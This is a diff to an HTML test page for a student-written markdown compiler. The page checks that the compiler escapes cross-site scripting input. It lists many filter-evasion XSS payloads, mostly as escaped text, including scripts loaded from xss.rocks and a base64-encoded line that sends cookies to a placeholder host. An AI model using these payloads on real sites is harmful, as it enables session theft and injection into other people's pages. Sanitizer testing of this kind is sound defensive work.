@@ -52,11 +52,290 @@
 				</p>
 				<p>It might get mad at me &amp; be bad or it might not get mad at me. volt&amp;amp or volt&quot;
 				</p>
-				<p><a href="http://josephmellor.xyz">Here is my website</a>.
+				<p><a href="http://ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~:/?#[]@!$&'()*+,;=">text</a>
+					<a href="http://josephmellor.xyz">Here is my website</a>.
 					<img src="http://josephmellor.xyz/resources/favicon-large.png" alt="I think this will have alt text and a width of 500px" width="500px">
 					<a href="http://josephmellor.xyz" title="Now it has title text" alt="and alt text">Here is my website</a>.
 					<a href="http://josephmellor.xyz"><img src="http://josephmellor.xyz/resources/favicon-large.png" alt="alt text"></a>
 				</p>
 				<img src="http://josephmellor.xyz" alt="That should be the source image">
-				<p><img src="http://"onmouseover="alert("lol")"" alt="alt text">
+				<p>Testing unicode: ▸.
 				</p>
+				<img src="http://josephmellor.xyz" alt="&quot; onmouseover=&quot;alert(&quot;lol&quot;)&quot;">
+				<ul>
+					<li>{{img "onmouseover="alert('lol')" alt text}} fails because the <code>"</code> is caught immediately.
+					</li>
+					<li>{{img java script:alert('lol') alt text}} will pass, but the url will be
+						"http://java", which is valid if "http://java" is valid.
+					</li>
+					<li>{{img java&tab;script:alert('lol') alt text}} fails because the tab is caught immediately.
+					</li>
+					<li>{{img jAvAsCrIpT:alert('lol') alt text}} fails because it is an invalid protocol.
+					</li>
+				</ul>
+				<p>{{img `jAvAsCrIpT:alert('lol')` alt text}} fails because the <code>`</code> is caught immediately.
+				</p>
+				<p>&lt;IMG SRC="javascript:alert('XSS');"&gt;
+				</p>
+				<p>&lt;IMG SRC=javascript:alert('XSS')&gt;
+				</p>
+				<p>&lt;IMG SRC=JaVaScRiPt:alert('XSS')&gt;
+				</p>
+				<p>&lt;IMG SRC=javascript:alert(&quot;XSS&quot;)&gt;
+				</p>
+				<p>&lt;IMG SRC=`javascript:alert("RSnake says, 'XSS'")`&gt;
+				</p>
+				<p>\&lt;a onmouseover="alert(document.cookie)"\&gt;xxs link\&lt;/a\&gt;
+				</p>
+				<p>\&lt;a onmouseover=alert(document.cookie)\&gt;xxs link\&lt;/a\&gt;
+				</p>
+				<p>&lt;IMG """&gt;&lt;SCRIPT&gt;alert("XSS")&lt;/SCRIPT&gt;"\&gt;
+				</p>
+				<p>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;
+				</p>
+				<p>&lt;IMG SRC=# onmouseover="alert('xxs')"&gt;
+				</p>
+				<p>&lt;IMG SRC= onmouseover="alert('xxs')"&gt;
+				</p>
+				<p>&lt;IMG onmouseover="alert('xxs')"&gt;
+				</p>
+				<p>&lt;IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"&gt;&lt;/img&gt;
+				</p>
+				<p>&lt;img src=x onerror="&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041"&gt;
+				</p>
+				<p>&lt;IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;&gt;
+				</p>
+				<p>&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;
+				</p>
+				<p>&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;
+				</p>
+				<p>&lt;IMG SRC="jav	ascript:alert('XSS');"&gt;
+				</p>
+				<p>&lt;IMG SRC="jav&#x09;ascript:alert('XSS');"&gt;
+				</p>
+				<p>&lt;IMG SRC="jav&#x0A;ascript:alert('XSS');"&gt;
+				</p>
+				<p>&lt;IMG SRC="jav&#x0D;ascript:alert('XSS');"&gt;
+				</p>
+				<p>&lt;IMG SRC=" &#14; javascript:alert('XSS');"&gt;
+				</p>
+				<p>\&lt;SCRIPT\\s != \&lt;SCRIPT/XSS\\s:
+					&lt;SCRIPT/XSS SRC="http://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;
+				</p>
+				<p>&lt;SCRIPT/SRC="http://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;
+				</p>
+				<p>&lt;&lt;SCRIPT&gt;alert("XSS");//\&lt;&lt;/SCRIPT&gt;
+				</p>
+				<p>&lt;SCRIPT SRC=http://xss.rocks/xss.js?&lt; B &gt;
+				</p>
+				<p>&lt;SCRIPT SRC=//xss.rocks/.j&gt;
+				</p>
+				<p>&lt;IMG SRC="`('XSS')"`
+				</p>
+				<p>&lt;iframe src=http://xss.rocks/scriptlet.html &lt;
+				</p>
+				<p>&lt;SCRIPT&gt;var a="$ENV<code>QUERY\_STRING</code>";&lt;/SCRIPT&gt;
+				</p>
+				<p>&lt;INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"&gt;
+				</p>
+				<p>&lt;IMG DYNSRC="javascript:alert('XSS')"&gt;
+				</p>
+				<p>&lt;IMG LOWSRC="javascript:alert('XSS')"&gt;
+				</p>
+				<p>&lt;STYLE&gt;li <code>list-style-image: url("javascript:alert('XSS')");</code>&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS&lt;/br&gt;
+				</p>
+				<p>&lt;IMG SRC='vbscript:msgbox("XSS")'&gt;
+				</p>
+				<p>&lt;IMG SRC="livescript:[code]"&gt;
+				</p>
+				<p>&lt;svg/onload=alert('XSS')&gt;
+				</p>
+				<p>&lt;BGSOUND SRC="javascript:alert('XSS');"&gt;
+				</p>
+				<p>&lt;BR SIZE="&<code>alert('XSS')</code>"&gt;
+				</p>
+				<p>&lt;TABLE BACKGROUND="javascript:alert('XSS')"&gt;
+				</p>
+				<p>&lt;FRAMESET&gt;&lt;FRAME SRC="javascript:alert('XSS');"&gt;&lt;/FRAMESET&gt;
+				</p>
+				<p>&lt;TABLE&gt;&lt;TD BACKGROUND="javascript:alert('XSS')"&gt;
+				</p>
+				<p>&lt;DIV STYLE="background-image: url(javascript:alert('XSS'))"&gt;
+				</p>
+				<p>&lt;DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"&gt;
+				</p>
+				<p>&lt;DIV STYLE="background-image: url(javascript:alert('XSS'))"&gt;
+				</p>
+				<p>&lt;DIV STYLE="width: expression(alert('XSS'));"&gt;
+				</p>
+				<p>&lt;!--[if gte IE 4]&gt;
+					&lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt;
+					&lt;![endif]--&gt;
+				</p>
+				<p>&lt;BASE HREF="javascript:alert('XSS');//"&gt;
+				</p>
+				<p>&lt;OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"&gt;&lt;/OBJECT&gt;
+				</p>
+				<p>&lt;EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"&gt;&lt;/EMBED&gt;
+				</p>
+				<p>&lt;EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"&gt;&lt;/EMBED&gt;
+				</p>
+				<p>&lt;XML ID="xss"&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC="javas&lt;!-- --&gt;cript:alert('XSS')"&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;
+					&lt;SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"&gt;&lt;/SPAN&gt;
+				</p>
+				<p>&lt;XML SRC="xsstest.xml" ID=I&gt;&lt;/XML&gt;
+					&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
+				</p>
+				<p>&lt;HTML&gt;&lt;BODY&gt;
+					&lt;?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"&gt;
+					&lt;?import namespace="t" implementation="#default#time2"&gt;
+					&lt;t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert("XSS")&lt;/SCRIPT&gt;"&gt;
+					&lt;/BODY&gt;&lt;/HTML&gt;
+				</p>
+				<p>&lt;SCRIPT SRC="http://xss.rocks/xss.jpg"&gt;&lt;/SCRIPT&gt;
+				</p>
+				<p>&lt;!--#exec cmd="/bin/echo '&lt;SCR'"--&gt;&lt;!--#exec cmd="/bin/echo 'IPT SRC=http://xss.rocks/xss.js&gt;&lt;/SCRIPT&gt;'"--&gt;
+				</p>
+				<p>&lt;IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"&gt;
+				</p>
+				<p>&lt;META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;"&gt;
+				</p>
+				<p>&lt;HEAD&gt;&lt;META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
+				</p>
+				<p>&lt;SCRIPT a="&gt;" SRC="httx://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;
+				</p>
+				<p>&lt;A HREF="http://66.102.7.147/"&gt;XSS&lt;/A&gt;
+				</p>
+				<p>&lt;A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D"&gt;XSS&lt;/A&gt;
+				</p>
+				<p>&lt;A HREF="http://1113982867/"&gt;XSS&lt;/A&gt;
+				</p>
+				<p>&lt;A HREF="http://0x42.0x0000066.0x7.0x93/"&gt;XSS&lt;/A&gt;
+				</p>
+				<p>&lt;A HREF="http://0102.0146.0007.00000223/"&gt;XSS&lt;/A&gt;
+				</p>
+				<p>&lt;img onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))"&gt;
+				</p>
+				<p>&lt;A HREF="h
+					tt  p://6	6.000146.0x7.147/"&gt;XSS&lt;/A&gt;
+				</p>
+				<p>&lt;A HREF="//www.google.com/"&gt;XSS&lt;/A&gt;
+				</p>
+				<p>&lt;A HREF="//google"&gt;XSS&lt;/A&gt;
+				</p>
+				<p>&lt;A HREF="http://ha.ckers.org@google"&gt;XSS&lt;/A&gt;
+				</p>
+				<p>&lt;A HREF="http://google:ha.ckers.org"&gt;XSS&lt;/A&gt;
+				</p>
+				<p>&lt;A HREF="http://google.com/"&gt;XSS&lt;/A&gt;
+				</p>
+				<p>&lt;A HREF="http://www.google.com./"&gt;XSS&lt;/A&gt;
+				</p>
+				<p>&lt;A HREF="javascript:document.location='http://www.google.com/'"&gt;XSS&lt;/A&gt;
+				</p>
+				<p>&lt;A HREF="http://www.google.com/ogle.com/"&gt;XSS&lt;/A&gt;
+				</p>
+				<p>&lt;
+					%3C
+					&amp;lt
+					&lt;
+					&amp;LT
+					&LT;
+					&amp;#60
+					&amp;#060
+					&amp;#0060
+					&amp;#00060
+					&amp;#000060
+					&amp;#0000060
+					&#60;
+					&#060;
+					&#0060;
+					&#00060;
+					&#000060;
+					&#0000060;
+					&amp;#x3c
+					&amp;#x03c
+					&amp;#x003c
+					&amp;#x0003c
+					&amp;#x00003c
+					&amp;#x000003c
+					&#x3c;
+					&#x03c;
+					&#x003c;
+					&#x0003c;
+					&#x00003c;
+					&#x000003c;
+					&amp;#X3c
+					&amp;#X03c
+					&amp;#X003c
+					&amp;#X0003c
+					&amp;#X00003c
+					&amp;#X000003c
+					&#X3c;
+					&#X03c;
+					&#X003c;
+					&#X0003c;
+					&#X00003c;
+					&#X000003c;
+					&amp;#x3C
+					&amp;#x03C
+					&amp;#x003C
+					&amp;#x0003C
+					&amp;#x00003C
+					&amp;#x000003C
+					&#x3C;
+					&#x03C;
+					&#x003C;
+					&#x0003C;
+					&#x00003C;
+					&#x000003C;
+					&amp;#X3C
+					&amp;#X03C
+					&amp;#X003C
+					&amp;#X0003C
+					&amp;#X00003C
+					&amp;#X000003C
+					&#X3C;
+					&#X03C;
+					&#X003C;
+					&#X0003C;
+					&#X00003C;
+					&#X000003C;
+					\x3c
+					\x3C
+					\u003c
+					\u003C
+				</p>
+				<div id="author-description-local">
+					<img src="https://tuacm.com/authors/joseph-mellor/large.jpg" id="author-description-image" alt="A picture of ../Joseph Mellor, the author.">
+					<div id="author-description-text">
+						<p>Joseph Mellor is a Senior at TU majoring in Physics, Computer Science, and
+						Math.
+						He is also the chief editor of the website and the author of the tumd markdown
+						compiler.
+						If you want to see more of his work, check out his <a
+						href="https://josephmellor.xyz">personal website</a>.
+						<br>
+						Credit to Allison Pennybaker for the picture.
+						</p>
+					</div>
+				</div>
+			</div>
+			<nav id="sidenav">
+			<a href="#scriptalertquottitle-xssquotscript" style="padding-left: 12px;">scriptalert(&quot;title xss&quot;)/script</a>
+			</nav>
+			<div id="sidenav-activator"></div>
+		</div>
+		<div id="footer" class="mt-5 py-5 text-center px-4">
+			<div id="footer-links">
+				<a href="#">Blog</a>
+				<a href="#">Get Involved</a>
+				<a href="http://hacktulsa.com">Hackathon</a>
+				<a href="#">GitHub</a>
+			</div>
+		</div>
+		<script src="https://tuacm.com/js/sidenav.js"></script>
+		<script src="https://tuacm.com/js/scriptalert(&quot;scripts".js></script>
+		<script src="https://tuacm.com/js/xss&quot;)/script".js></script>
+	</body>
+</html>
